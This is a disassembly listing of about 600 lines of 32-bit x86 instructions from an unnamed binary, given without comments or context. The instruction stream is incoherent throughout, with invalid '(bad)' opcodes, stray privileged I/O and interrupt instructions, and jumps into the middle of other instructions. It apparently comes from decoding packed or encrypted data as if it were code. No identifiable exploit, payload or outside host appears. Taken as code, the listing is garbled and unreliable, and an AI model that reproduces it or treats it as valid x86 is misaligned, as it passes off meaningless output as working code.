  416377:	d6                   	salc
  416378:	85 0d a7 d3 d4 dd    	test   %ecx,0xddd4d3a7
  41637e:	6d                   	insl   (%dx),%es:(%edi)
  41637f:	37                   	aaa
  416380:	17                   	pop    %ss
  416381:	b7 46                	mov    $0x46,%bh
  416383:	ba ed 58 08 d8       	mov    $0xd80858ed,%edx
  416388:	d8 1d c6 38 d7 bb    	fcomps 0xbbd738c6
  41638e:	ad                   	lods   %ds:(%esi),%eax
  41638f:	fd                   	std
  416390:	65 df 55 c8          	fists  %gs:-0x38(%ebp)
  416394:	d3 db                	rcr    %cl,%ebx
  416396:	d7                   	xlat   %ds:(%ebx)
  416397:	da 00                	fiaddl (%eax)
  416399:	b1 a5                	mov    $0xa5,%cl
  41639b:	b4 ad                	mov    $0xad,%ah
  41639d:	2b 15 1b 6b 7f b7    	sub    0xb77f6b1b,%edx
  4163a3:	b1 76                	mov    $0x76,%cl
  4163a5:	d0 90 0c b0 d3 cb    	rclb   $1,-0x342c4ff4(%eax)
  4163ab:	59                   	pop    %ecx
  4163ac:	09 aa 2c bf 90 bf    	or     %ebp,-0x406f40d4(%edx)
  4163b2:	98                   	cwtl
  4163b3:	92                   	xchg   %eax,%edx
  4163b4:	23 b6 c9 c5 ca ca    	and    -0x35353a37(%esi),%esi
  4163ba:	00 b7 b5 d9 9b 6d    	add    %dh,0x6d9bd9b5(%edi)
  4163c0:	bd db 51 6e 09       	mov    $0x96e51db,%ebp
  4163c5:	1a 6e 77             	sbb    0x77(%esi),%ch
  4163c8:	64 af                	fs scas %es:(%edi),%eax
  4163ca:	b7 6a                	mov    $0x6a,%bh
  4163cc:	0e                   	push   %cs
  4163cd:	b1 e1                	mov    $0xe1,%cl
  4163cf:	c5 cb 98             	(bad)
  4163d2:	70 f6                	jo     0x4163ca
  4163d4:	da b7 af 43 d0 b8    	fidivl -0x472fbc51(%edi)
  4163da:	cd d1                	int    $0xd1
  4163dc:	c1 33 08             	shll   $0x8,(%ebx)
  4163df:	d4 61                	aam    $0x61
  4163e1:	f6 c3 be             	test   $0xbe,%bl
  4163e4:	33 d8                	xor    %eax,%ebx
  4163e6:	b5 d9                	mov    $0xd9,%ch
  4163e8:	cd 23                	int    $0x23
  4163ea:	90                   	nop
  4163eb:	a8 c9                	test   $0xc9,%al
  4163ed:	ca 3d 19             	lret   $0x193d
  4163f0:	25 bb dd da 31       	and    $0x31daddbb,%eax
  4163f5:	ad                   	lods   %ds:(%esi),%eax
  4163f6:	d7                   	xlat   %ds:(%ebx)
  4163f7:	d4 fe                	aam    $0xfe
  4163f9:	c7                   	(bad)
  4163fa:	cc                   	int3
  4163fb:	42                   	inc    %edx
  4163fc:	b6 b6                	mov    $0xb6,%dh
  4163fe:	b9 83 08 a6 d3       	mov    $0xd3a60883,%ecx
  416403:	ff 97 cb 1e de d6    	call   *-0x2921e135(%edi)
  416409:	03 50 2b             	add    0x2b(%eax),%edx
  41640c:	14 78                	adc    $0x78,%al
  41640e:	a0 e3 6f 0d f2       	mov    0xf20d6fe3,%al
  416413:	a1 4e f8 db a8       	mov    0xa8dbf84e,%eax
  416418:	fc                   	cld
  416419:	8d 07                	lea    (%edi),%eax
  41641b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41641c:	fa                   	cli
  41641d:	e2 0a                	loop   0x416429
  41641f:	b4 f8                	mov    $0xf8,%ah
  416421:	cd 3b                	int    $0x3b
  416423:	6f                   	outsl  %ds:(%esi),(%dx)
  416424:	de 93 a7 20 e8 fc    	ficoms -0x317df59(%ebx)
  41642a:	8d 95 2b fb d9 7b    	lea    0x7bd9fb2b(%ebp),%edx
  416430:	d7                   	xlat   %ds:(%ebx)
  416431:	1e                   	push   %ds
  416432:	0d 17 78 8b 85       	or     $0x858b7817,%eax
  416437:	0c 18                	or     $0x18,%al
  416439:	ff 15 74 c8 2f b0    	call   *0xb02fc874
  41643f:	00 ba 7f 66 be 00    	add    %bh,0xbe667f(%edx)
  416445:	02 8d 9d b0 15 b8    	add    -0x47ea4f63(%ebp),%cl
  41644b:	cd a9                	int    $0xa9
  41644d:	ee                   	out    %al,(%dx)
  41644e:	e2 7f                	loop   0x4164cf
  416450:	54                   	push   %esp
  416451:	88 03                	mov    %al,(%ebx)
  416453:	43                   	inc    %ebx
  416454:	66 ff ce             	dec    %si
  416457:	75 ee                	jne    0x416447
  416459:	e7 8d                	out    %eax,$0x8d
  41645b:	85 b0 09 d5 c9 62    	test   %esi,0x62c9d509(%eax)
  416461:	1d 1a 74 53 0f       	sbb    $0xf53741a,%eax
  416466:	1d 78 40 44 4e       	sbb    $0x4e444078,%eax
  41646b:	f6 e9                	imul   %cl
  41646d:	10 0f                	adc    %cl,(%edi)
  41646f:	1b e8                	sbb    %eax,%ebp
  416471:	55                   	push   %ebp
  416472:	e0 0f                	loopne 0x416483
  416474:	6e                   	outsb  %ds:(%esi),(%dx)
  416475:	bb 05 05 f1 c1       	mov    $0xc1f10505,%ebx
  41647a:	f8                   	clc
  41647b:	09 f6                	or     %esi,%esi
  41647d:	79 21                	jns    0x4164a0
  41647f:	97                   	xchg   %eax,%edi
  416480:	2d 5d 09 30 94       	sub    $0x9430095d,%eax
  416485:	1e                   	push   %ds
  416486:	34 35                	xor    $0x35,%al
  416488:	08 f6                	or     %dh,%dh
  41648a:	16                   	push   %ss
  41648b:	a9 b8 fc 01 77       	test   $0x7701fcb8,%eax
  416490:	4a                   	dec    %edx
  416491:	86 ec                	xchg   %ch,%ah
  416493:	32 b3 ac af 54 70    	xor    0x7054afac(%ebx),%dh
  416499:	64 90                	fs nop
  41649b:	c9                   	leave
  41649c:	6e                   	outsb  %ds:(%esi),(%dx)
  41649d:	14 4c                	adc    $0x4c,%al
  41649f:	30 6a 02             	xor    %ch,0x2(%edx)
  4164a2:	e1 33                	loope  0x4164d7
  4164a4:	27                   	daa
  4164a5:	cb                   	lret
  4164a6:	6c                   	insb   (%dx),%es:(%edi)
  4164a7:	c8 78 c1 42          	enter  $0xc178,$0x42
  4164ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4164ac:	e7 ba                	out    %eax,$0xba
  4164ae:	30 e2                	xor    %ah,%dl
  4164b0:	35 c4 df e5 10       	xor    $0x10e5dfc4,%eax
  4164b5:	f9                   	stc
  4164b6:	b0 04                	mov    $0x4,%al
  4164b8:	ff 53 2c             	call   *0x2c(%ebx)
  4164bb:	f8                   	clc
  4164bc:	58                   	pop    %eax
  4164bd:	c0 7b 3f 62          	sarb   $0x62,0x3f(%ebx)
  4164c1:	b9 f4 01 e0 11       	mov    $0x11e001f4,%ecx
  4164c6:	af                   	scas   %es:(%edi),%eax
  4164c7:	1f                   	pop    %ds
  4164c8:	25 79 78 2f 6c       	and    $0x6c2f7879,%eax
  4164cd:	58                   	pop    %eax
  4164ce:	e8 62 5d f9 44       	call   0x453ac235
  4164d3:	ec                   	in     (%dx),%al
  4164d4:	81 ec 52 95 27 75    	sub    $0x75279552,%esp
  4164da:	61                   	popa
  4164db:	c4 a6 df 56 60 76    	les    0x766056df(%esi),%esp
  4164e1:	89 52 bd             	mov    %edx,-0x43(%edx)
  4164e4:	12 be ec bc f5 c0    	adc    -0x3f0a4314(%esi),%bh
  4164ea:	90                   	nop
  4164eb:	70 9b                	jo     0x416488
  4164ed:	1f                   	pop    %ds
  4164ee:	5f                   	pop    %edi
  4164ef:	5b                   	pop    %ebx
  4164f0:	93                   	xchg   %eax,%ebx
  4164f1:	fd                   	std
  4164f2:	8c a8 9b ac fe cb    	mov    %gs,-0x34015365(%eax)
  4164f8:	75 e3                	jne    0x4164dd
  4164fa:	a9 ef 84 20 f6       	test   $0xf62084ef,%eax
  4164ff:	22 34 7a             	and    (%edx,%edi,2),%dh
  416502:	24 7b                	and    $0x7b,%al
  416504:	c8 59 b4 73          	enter  $0xb459,$0x73
  416508:	e2 53                	loop   0x41655d
  41650a:	bb 56 21 1a d9       	mov    $0xd91a2156,%ebx
  41650f:	fd                   	std
  416510:	b8 5c 71 40 26       	mov    $0x2640715c,%eax
  416515:	10 b1 5f 60 3c b6    	adc    %dh,-0x49c39fa1(%ecx)
  41651b:	03 77 a3             	add    -0x5d(%edi),%esi
  41651e:	44                   	inc    %esp
  41651f:	fa                   	cli
  416520:	8b a3 48 07 08 a3    	mov    -0x5cf7f8b8(%ebx),%esp
  416526:	4c                   	dec    %esp
  416527:	f2 c8 23 8f 0c       	repnz enter $0x8f23,$0xc
  41652c:	a3 50 10 a3 54       	mov    %eax,0x54a31050
  416531:	14 a3                	adc    $0xa3,%al
  416533:	58                   	pop    %eax
  416534:	c8 23 8f 3c          	enter  $0x8f23,$0x3c
  416538:	18 a3 5c 1c a3 60    	sbb    %ah,0x60a31c5c(%ebx)
  41653e:	20 a3 64 23 8f 3c    	and    %ah,0x3c8f2364(%ebx)
  416544:	f2 24 a3             	repnz and $0xa3,%al
  416547:	68 28 a3 6c 2c       	push   $0x2c6ca328
  41654c:	a3 70 30 e9 3e       	mov    %eax,0x3ee93070
  416551:	f2 c8 a3 74 34       	repnz enter $0x74a3,$0x34
  416556:	a3 78 38 a3 7c       	mov    %eax,0x7ca33878
  41655b:	c8 86 6c 64          	enter  $0x6c86,$0x64
  41655f:	90                   	nop
  416560:	01 19                	add    %ebx,(%ecx)
  416562:	14 80                	adc    $0x80,%al
  416564:	84 be 41 06 19 88    	test   %bh,-0x77e6f9bf(%esi)
  41656a:	8c 90 36 78 19 64    	mov    %ss,0x64197836(%eax)
  416570:	40                   	inc    %eax
  416571:	c6                   	(bad)
  416572:	bd 18 94 98 64       	mov    $0x64989418,%ebp
  416577:	90                   	nop
  416578:	41                   	inc    %ecx
  416579:	06                   	push   %es
  41657a:	9c                   	pushf
  41657b:	a0 a4 90 41 06       	mov    0x64190a4,%al
  416580:	19 a8 ac b0 ec 06    	sbb    %ebp,0x6ecb0ac(%eax)
  416586:	19 64 b4 b8          	sbb    %esp,-0x48(%esp,%esi,4)
  41658a:	bc 66 68 84 fb       	mov    $0xfb846866,%esp
  41658f:	f0 1e                	lock push %ds
  416591:	c1 a6 50 68 90 0a 7f 	shll   $0x7f,0xa906850(%esi)
  416598:	a3 c0 19 10 27       	mov    %eax,0x271019c0
  41659d:	b9 e4 a0 ac c4       	mov    $0xc4aca0e4,%ecx
  4165a2:	c8 f6 29 83          	enter  $0x29f6,$0x83
  4165a6:	78 5a                	js     0x416602
  4165a8:	5b                   	pop    %ebx
  4165a9:	6d                   	insl   (%dx),%es:(%edi)
  4165aa:	61                   	popa
  4165ab:	70 69                	jo     0x416616
  4165ad:	0d b9 1f d6 1e       	or     $0x1ed61fb9,%eax
  4165b2:	75 73                	jne    0x416627
  4165b4:	1c 0b                	sbb    $0xb,%al
  4165b6:	73 68                	jae    0x416620
  4165b8:	6c                   	insb   (%dx),%es:(%edi)
  4165b9:	77 1a                	ja     0x4165d5
  4165bb:	36 14 4b             	ss adc $0x4b,%al
  4165be:	8c 0c 50             	mov    %cs,(%eax,%edx,2)
  4165c1:	ba 68 45 45 78       	mov    $0x78454568,%edx
  4165c6:	12 ed                	adc    %ch,%ch
  4165c8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4165c9:	26 ce                	es into
  4165cb:	73 a9                	jae    0x416576
  4165cd:	77 69                	ja     0x416638
  4165cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4165d0:	01 d2                	add    %edx,%edx
  4165d2:	41                   	inc    %ecx
  4165d3:	7c 4d                	jl     0x416622
  4165d5:	bd 1b c7 74 51       	mov    $0x5174c71b,%ebp
  4165da:	74 8a                	je     0x416566
  4165dc:	4b                   	dec    %ebx
  4165dd:	b0 bd                	mov    $0xbd,%al
  4165df:	a3 43 6f 6e 08       	mov    %eax,0x86e6f43
  4165e4:	63 8d 53 74 5e bc    	arpl   %ecx,-0x43a18bad(%ebp)
  4165ea:	1f                   	pop    %ds
  4165eb:	44                   	inc    %esp
  4165ec:	d0 13                	rclb   $1,(%ebx)
  4165ee:	c9                   	leave
  4165ef:	51                   	push   %ecx
  4165f0:	00 e1                	add    %ah,%cl
  4165f2:	3a 90 4f 9d c8 2d    	cmp    0x2dc89d4f(%eax),%dl
  4165f8:	b0 72                	mov    $0x72,%al
  4165fa:	d7                   	xlat   %ds:(%ebx)
  4165fb:	55                   	push   %ebp
  4165fc:	84 5a 04             	test   %bl,0x4(%edx)
  4165ff:	b6 09                	mov    $0x9,%dh
  416601:	b5 7f                	mov    $0x7f,%ch
  416603:	6b d5 6f             	imul   $0x6f,%ebp,%edx
  416606:	79 66                	jns    0x41666e
  416608:	85 f6                	test   %esi,%esi
  41660a:	72 26                	jb     0x416632
  41660c:	7a 1c                	jp     0x41662a
  41660e:	f0 0f b7 d3          	lock movzwl %bx,%edx
  416612:	0f b6 73 51          	movzbl 0x51(%ebx),%esi
  416616:	e9 f9 14 17 83       	jmp    0x83587b14
  41661b:	ea 64 10 a9 01 0a ae 	ljmp   $0xae0a,$0x1a91064
  416622:	09 18                	or     %ebx,(%eax)
  416624:	e9 7c ba dd b2       	jmp    0xb31f20a5
  416629:	c8 4d 58 47          	enter  $0x584d,$0x47
  41662d:	8d 63 12             	lea    0x12(%ebx),%esp
  416630:	66 bb 5d bb          	mov    $0xbb5d,%bx
  416634:	b8 10 da 0a ae       	mov    $0xae0ada10,%eax
  416639:	34 2e                	xor    $0x2e,%al
  41663b:	68 2d 03 43 fe       	push   $0xfe43032d
  416640:	75 58                	jne    0x41669a
  416642:	9c                   	pushf
  416643:	16                   	push   %ss
  416644:	2a 49 d6             	sub    -0x2a(%ecx),%cl
  416647:	16                   	push   %ss
  416648:	cc                   	int3
  416649:	a1 b6 87 0e e8       	mov    0xe80e87b6,%eax
  41664e:	d4 d0                	aam    $0xd0
  416650:	1c c3                	sbb    $0xc3,%al
  416652:	11 c5                	adc    %eax,%ebp
  416654:	3b bb 50 e8 81 fc    	cmp    -0x37e17b0(%ebx),%edi
  41665a:	85 cf                	test   %ecx,%edi
  41665c:	51                   	push   %ecx
  41665d:	6e                   	outsb  %ds:(%esi),(%dx)
  41665e:	c4 7b 93             	les    -0x6d(%ebx),%edi
  416661:	55                   	push   %ebp
  416662:	43                   	inc    %ebx
  416663:	30 95 d5 a5 4b 91    	xor    %dl,-0x6eb45a2b(%ebp)
  416669:	fc                   	cld
  41666a:	9c                   	pushf
  41666b:	ac                   	lods   %ds:(%esi),%al
  41666c:	f7 b7 72 ec ba 04    	divl   0x4baec72(%edi)
  416672:	43                   	inc    %ebx
  416673:	ea 11 a1 02 c9 0f 72 	ljmp   $0x720f,$0xc902a111
  41667a:	90                   	nop
  41667b:	30 40 fd             	xor    %al,-0x3(%eax)
  41667e:	17                   	pop    %ss
  41667f:	fd                   	std
  416680:	72 70                	jb     0x4166f2
  416682:	89 30                	mov    %esi,(%eax)
  416684:	5c                   	pop    %esp
  416685:	c8 8b f2 0c          	enter  $0xf28b,$0xc
  416689:	b1 23                	mov    $0x23,%cl
  41668b:	89 43 52             	mov    %eax,0x52(%ebx)
  41668e:	dc 04 73             	faddl  (%ebx,%esi,2)
  416691:	23 40 03             	and    0x3(%eax),%eax
  416694:	05 ce c8 c8 57       	add    $0x57c8c8ce,%eax
  416699:	2c d2                	sub    $0xd2,%al
  41669b:	81 06 b7 bf 79 84    	addl   $0x8479bfb7,(%esi)
  4166a1:	c5 c7 c7             	(bad)
  4166a4:	d3 d9                	rcr    %cl,%ecx
  4166a6:	0c 84                	or     $0x84,%al
  4166a8:	d1 ac 4b e0 bd 40 a3 	shrl   $1,-0x5cbf4220(%ebx,%ecx,2)
  4166af:	d6                   	salc
  4166b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4166b1:	74 c5                	je     0x416678
  4166b3:	d9 d0                	fnop
  4166b5:	0f 76 84 1d 56 a0 1c 	pcmpeqd -0x6fe35faa(%ebp,%ebx,1),%mm0
  4166bc:	90 
  4166bd:	2d c0 0f b0 83       	sub    $0x83b00fc0,%eax
  4166c2:	07                   	pop    %es
  4166c3:	0f d7 c0             	pmovmskb %mm0,%eax
  4166c6:	90                   	nop
  4166c7:	7d 8e                	jge    0x416657
  4166c9:	90                   	nop
  4166ca:	92                   	xchg   %eax,%edx
  4166cb:	c1 e0 17             	shl    $0x17,%eax
  4166ce:	68 29 b9 c9 c8       	push   $0xc8c9b929
  4166d3:	96                   	xchg   %eax,%esi
  4166d4:	cf                   	iret
  4166d5:	90                   	nop
  4166d6:	64 30 68 50          	xor    %ch,%fs:0x50(%eax)
  4166da:	e2 c0                	loop   0x41669c
  4166dc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4166dd:	d9 2f                	fldcw  (%edi)
  4166df:	59                   	pop    %ecx
  4166e0:	ac                   	lods   %ds:(%esi),%al
  4166e1:	2c b0                	sub    $0xb0,%al
  4166e3:	40                   	inc    %eax
  4166e4:	fb                   	sti
  4166e5:	c0 b9 d2 17 a9 c5 fd 	sarb   $0xfd,-0x3a56e82e(%ecx)
  4166ec:	c0 c9 b6             	ror    $0xb6,%cl
  4166ef:	df 4a 5a             	fisttps 0x5a(%edx)
  4166f2:	0e                   	push   %cs
  4166f3:	cf                   	iret
  4166f4:	c9                   	leave
  4166f5:	dd 96 94 00 90 15    	fstl   0x15900094(%esi)
  4166fb:	5b                   	pop    %ebx
  4166fc:	bb 81 83 b7 a8       	mov    $0xa8b78381,%ebx
  416701:	2b 90 c0 04 59 d1    	sub    -0x2ea6fb40(%eax),%edx
  416707:	ec                   	in     (%dx),%al
  416708:	12 1b                	adc    (%ebx),%bl
  41670a:	7c 09                	jl     0x416715
  41670c:	b1 9f                	mov    $0x9f,%cl
  41670e:	d4 29                	aam    $0x29
  416710:	d9 d7                	(bad)
  416712:	4f                   	dec    %edi
  416713:	b7 f6                	mov    $0xf6,%bh
  416715:	61                   	popa
  416716:	ab                   	stos   %eax,%es:(%edi)
  416717:	29 84 96 92 50 0d dd 	sub    %eax,-0x22f2af6e(%esi,%edx,4)
  41671e:	84 77 89             	test   %dh,-0x77(%edi)
  416721:	db 06                	fildl  (%esi)
  416723:	98                   	cwtl
  416724:	c5 29                	lds    (%ecx),%ebp
  416726:	c8 84 46 d0          	enter  $0x4684,$0xd0
  41672a:	c8 d9 ee d8          	enter  $0xeed9,$0xd8
  41672e:	0d 5a bc 06 29       	or     $0x2906bc5a,%eax
  416733:	90                   	nop
  416734:	d7                   	xlat   %ds:(%ebx)
  416735:	13 c8                	adc    %eax,%ecx
  416737:	cd aa                	int    $0xaa
  416739:	d1 36                	shll   $1,(%esi)
  41673b:	38 fb                	cmp    %bh,%bl
  41673d:	af                   	scas   %es:(%edi),%eax
  41673e:	c5 de c5             	(bad)
  416741:	c5 05 c0 a0 c7 42    	lds    0x42c7a0c0,%eax
  416747:	1f                   	pop    %ds
  416748:	fc                   	cld
  416749:	9d                   	popf
  41674a:	2b 36                	sub    (%esi),%esi
  41674c:	e7 ee                	out    %eax,$0xee
  41674e:	94                   	xchg   %eax,%esp
  41674f:	95                   	xchg   %eax,%ebp
  416750:	96                   	xchg   %eax,%esi
  416751:	97                   	xchg   %eax,%edi
  416752:	98                   	cwtl
  416753:	99                   	cltd
  416754:	9e                   	sahf
  416755:	71 c5                	jno    0x41671c
  416757:	2e f6 5e 89          	negb   %cs:-0x77(%esi)
  41675b:	c6                   	(bad)
  41675c:	3c 46                	cmp    $0x46,%al
  41675e:	89 4e 2d             	mov    %ecx,0x2d(%esi)
  416761:	b7 3d                	mov    $0x3d,%bh
  416763:	c9                   	leave
  416764:	64 08 c0             	fs or  %al,%al
  416767:	b8 d6 c5 84 ca       	mov    $0xca84c5d6,%eax
  41676c:	ff 06                	incl   (%esi)
  41676e:	97                   	xchg   %eax,%edi
  41676f:	68 b7 d3 db d2       	push   $0xd2dbd3b7
  416774:	67 24 d7             	addr16 and $0xd7,%al
  416777:	b4 ab                	mov    $0xab,%ah
  416779:	de 5a 73             	ficomps 0x73(%edx)
  41677c:	f0 cc                	lock int3
  41677e:	90                   	nop
  41677f:	b0 d8                	mov    $0xd8,%al
  416781:	b7 23                	mov    $0x23,%bh
  416783:	32 b1 b8 b4 26 66    	xor    0x6626b4b8(%ecx),%dh
  416789:	dd d6                	fst    %st(6)
  41678b:	8f                   	(bad)
  41678c:	20 da                	and    %bl,%dl
  41678e:	88 ad af 7d ec 2d    	mov    %ch,0x2dec7daf(%ebp)
  416794:	31 6b a5             	xor    %ebp,-0x5b(%ebx)
  416797:	a2 b0 9e af 3b       	mov    %al,0x3baf9eb0
  41679c:	6c                   	insb   (%dx),%es:(%edi)
  41679d:	c2 b7 96             	ret    $0x96b7
  4167a0:	2e 20 d6             	cs and %dl,%dh
  4167a3:	d8 d9                	fcomp  %st(1)
  4167a5:	d4 4d                	aam    $0x4d
  4167a7:	f8                   	clc
  4167a8:	ba ad 6d 21 1a       	mov    $0x1a216dad,%edx
  4167ad:	d4 2c                	aam    $0x2c
  4167af:	10 d6                	adc    %dl,%dh
  4167b1:	43                   	inc    %ebx
  4167b2:	c9                   	leave
  4167b3:	2d b8 08 d6 4d       	sub    $0x4dd608b8,%eax
  4167b8:	e5 7a                	in     $0x7a,%eax
  4167ba:	36 d1 de             	ss rcr $1,%esi
  4167bd:	b6 1d                	mov    $0x1d,%dh
  4167bf:	b6 1d                	mov    $0x1d,%dh
  4167c1:	84 41 db             	test   %al,-0x25(%ecx)
  4167c4:	3c 92                	cmp    $0x92,%al
  4167c6:	02 cd                	add    %ch,%cl
  4167c8:	07                   	pop    %es
  4167c9:	b6 5d                	mov    $0x5d,%dh
  4167cb:	28 f1                	sub    %dh,%cl
  4167cd:	44                   	inc    %esp
  4167ce:	28 ae 90 d6 03 c8    	sub    %ch,-0x37fc2970(%esi)
  4167d4:	31 7f 83             	xor    %edi,-0x7d(%edi)
  4167d7:	6c                   	insb   (%dx),%es:(%edi)
  4167d8:	8b 68 c3             	mov    -0x3d(%eax),%ebp
  4167db:	5e                   	pop    %esi
  4167dc:	28 bb a5 a6 c3 bf    	sub    %bh,-0x403c595b(%ebx)
  4167e2:	f8                   	clc
  4167e3:	ba c0 03 98 04       	mov    $0x49803c0,%edx
  4167e8:	84 47 84             	test   %al,-0x7c(%edi)
  4167eb:	b2 c5                	mov    $0xc5,%dl
  4167ed:	d1 de                	rcr    $1,%esi
  4167ef:	c2 b9 f6             	ret    $0xf6b9
  4167f2:	0f 1c c3             	nop    %ebx
  4167f5:	d2 d9                	rcr    %cl,%cl
  4167f7:	d1 a7 30 c4 d9 36    	shll   $1,0x36d9c430(%edi)
  4167fd:	cc                   	int3
  4167fe:	dd 05 d8 db c7 4a    	fldl   0x4ac7dbd8
  416804:	25 b8 4d 86 49       	and    $0x49864db8,%eax
  416809:	0c 1b                	or     $0x1b,%al
  41680b:	19 b3 4d 35 b1 89    	sbb    %esi,-0x764ecab3(%ebx)
  416811:	6f                   	outsl  %ds:(%esi),(%dx)
  416812:	a0 d9 c6 d7 dd       	mov    0xddd7c6d9,%al
  416817:	b2 d1                	mov    $0xd1,%dl
  416819:	c0 de ca             	rcr    $0xca,%dh
  41681c:	1b 6c 86 c1          	sbb    -0x3f(%esi,%eax,4),%ebp
  416820:	5b                   	pop    %ebx
  416821:	3b 7b 0f             	cmp    0xf(%ebx),%edi
  416824:	90                   	nop
  416825:	33 63 8c             	xor    -0x74(%ebx),%esp
  416828:	90                   	nop
  416829:	00 58 a9             	add    %bl,-0x57(%eax)
  41682c:	ad                   	lods   %ds:(%esi),%eax
  41682d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41682e:	68 b4 43 0b d6       	push   $0xd60b43b4
  416833:	d6                   	salc
  416834:	7c 04                	jl     0x41683a
  416836:	9a c5 17 1e 5b e0 d8 	lcall  $0xd8e0,$0x5b1e17c5
  41683d:	dc ad 91 bb 23 d1    	fsubrl -0x2edc446f(%ebp)
  416843:	92                   	xchg   %eax,%edx
  416844:	b4 d0                	mov    $0xd0,%ah
  416846:	ec                   	in     (%dx),%al
  416847:	ed                   	in     (%dx),%eax
  416848:	ee                   	out    %al,(%dx)
  416849:	ad                   	lods   %ds:(%esi),%eax
  41684a:	fb                   	sti
  41684b:	85 bc 92 a7 ac b3 aa 	test   %edi,-0x554c5359(%edx,%edx,4)
  416852:	b8 ce b6 a9 c0       	mov    $0xc0a9b6ce,%eax
  416857:	0a be e6 b6 07 b1    	or     -0x4ef8491a(%esi),%bh
  41685d:	cd c7                	int    $0xc7
  41685f:	4f                   	dec    %edi
  416860:	d7                   	xlat   %ds:(%ebx)
  416861:	c5 14 49             	lds    (%ecx,%ecx,2),%edx
  416864:	92                   	xchg   %eax,%edx
  416865:	1c d6                	sbb    $0xd6,%al
  416867:	d0 17                	rclb   $1,(%edi)
  416869:	20 90 da cd cf 19    	and    %dl,0x19cfcdda(%eax)
  41686f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  416870:	0e                   	push   %cs
  416871:	d9 bf d0 8d 61 65    	fnstcw 0x65618dd0(%edi)
  416877:	a9 b2 bb 29 a9       	test   $0xa929bbb2,%eax
  41687c:	92                   	xchg   %eax,%edx
  41687d:	a9 bc a9 30 2c       	test   $0x2c30a9bc,%eax
  416882:	dc 0a                	fmull  (%edx)
  416884:	53                   	push   %ebx
  416885:	32 c7                	xor    %bh,%al
  416887:	cf                   	iret
  416888:	46                   	inc    %esi
  416889:	92                   	xchg   %eax,%edx
  41688a:	4c                   	dec    %esp
  41688b:	88 dd                	mov    %bl,%ch
  41688d:	22 5d 76             	and    0x76(%ebp),%bl
  416890:	a8 84                	test   $0x84,%al
  416892:	02 40 d4             	add    -0x2c(%eax),%al
  416895:	d6                   	salc
  416896:	10 66 4f             	adc    %ah,0x4f(%esi)
  416899:	87 74 de 14          	xchg   %esi,0x14(%esi,%ebx,8)
  41689d:	cf                   	iret
  41689e:	3d d0 29 b3 d6       	cmp    $0xd6b329d0,%eax
  4168a3:	88 ed                	mov    %ch,%ch
  4168a5:	61                   	popa
  4168a6:	d4 cd                	aam    $0xcd
  4168a8:	08 a9 16 13 87 c7    	or     %ch,-0x3878ecea(%ecx)
  4168ae:	b0 1d                	mov    $0x1d,%al
  4168b0:	95                   	xchg   %eax,%ebp
  4168b1:	d0 db                	rcr    $1,%bl
  4168b3:	16                   	push   %ss
  4168b4:	38 6b c1             	cmp    %ch,-0x3f(%ebx)
  4168b7:	90                   	nop
  4168b8:	8b 42 d6             	mov    -0x2a(%edx),%eax
  4168bb:	d1 af b9 0a d2 98    	shrl   $1,-0x672df547(%edi)
  4168c1:	a9 cd 7b 1b ad       	test   $0xad1b7bcd,%eax
  4168c6:	88 d0                	mov    %dl,%al
  4168c8:	0c 75                	or     $0x75,%al
  4168ca:	18 49 ac             	sbb    %cl,-0x54(%ecx)
  4168cd:	d2 bd e9 75 ea d6    	sarb   %cl,-0x29158a17(%ebp)
  4168d3:	d1 e9                	shr    $1,%ecx
  4168d5:	d8 60 b8             	fsubs  -0x48(%eax)
  4168d8:	c8 b8 b9 f8          	enter  $0xb9b8,$0xf8
  4168dc:	4f                   	dec    %edi
  4168dd:	bc 36 6d c4 cc       	mov    $0xccc46d36,%esp
  4168e2:	e2 a1                	loop   0x416885
  4168e4:	1c 0b                	sbb    $0xb,%al
  4168e6:	64 c3                	fs ret
  4168e8:	36 2f                	ss das
  4168ea:	39 58 2f             	cmp    %ebx,0x2f(%eax)
  4168ed:	38 77 9c             	cmp    %dh,-0x64(%edi)
  4168f0:	d0 15 b8 2c 62 24    	rclb   $1,0x24622cb8
  4168f6:	f1                   	int1
  4168f7:	28 42 17             	sub    %al,0x17(%edx)
  4168fa:	cf                   	iret
  4168fb:	ad                   	lods   %ds:(%esi),%eax
  4168fc:	85 3c 3f             	test   %edi,(%edi,%edi,1)
  4168ff:	77 3b                	ja     0x41693c
  416901:	9c                   	pushf
  416902:	d0 a7 55 28 34 fe    	shlb   $1,-0x1cbd7ab(%edi)
  416908:	af                   	scas   %es:(%edi),%eax
  416909:	bd 97 84 91 84       	mov    $0x84918497,%ebp
  41690e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41690f:	0a 9a f5 da b6 61    	or     0x61b6daf5(%edx),%bl
  416915:	d8 06                	fadds  (%esi)
  416917:	c5 84 64 7d 84 9d c8 	lds    -0x37627b83(%esp,%eiz,2),%eax
  41691e:	d3 6f 5b             	shrl   %cl,0x5b(%edi)
  416921:	28 98 bf 84 8b d0    	sub    %bl,-0x2f747b41(%eax)
  416927:	05 d2 16 db da       	add    $0xdadb16d2,%eax
  41692c:	86 a3 cf db 85 a7    	xchg   %ah,-0x587a2431(%ebx)
  416932:	a2 12 d8 a8 24       	mov    %al,0x24a8d812
  416937:	0b b7 42 2e 1a a7    	or     -0x58e5d1be(%edi),%esi
  41693d:	cc                   	int3
  41693e:	dc c8                	fmul   %st,%st(0)
  416940:	d4 82                	aam    $0x82
  416942:	d5 fe                	aad    $0xfe
  416944:	bc b4 90 a5 ad       	mov    $0xada590b4,%esp
  416949:	b1 1c                	mov    $0x1c,%cl
  41694b:	58                   	pop    %eax
  41694c:	cc                   	int3
  41694d:	5a                   	pop    %edx
  41694e:	43                   	inc    %ebx
  41694f:	df b4 4f d0 23 b1 b7 	fbstp  -0x484edc30(%edi,%ecx,2)
  416956:	b2 84                	mov    $0x84,%dl
  416958:	b4 ca                	mov    $0xca,%ah
  41695a:	db 41 32             	fildl  0x32(%ecx)
  41695d:	53                   	push   %ebx
  41695e:	9b db 57 ac          	fistl  -0x54(%edi)
  416962:	37                   	aaa
  416963:	13 84 4e 1f 0b 4f 3d 	adc    0x3d4f0b1f(%esi,%ecx,2),%eax
  41696a:	5e                   	pop    %esi
  41696b:	12 11                	adc    (%ecx),%dl
  41696d:	47                   	inc    %edi
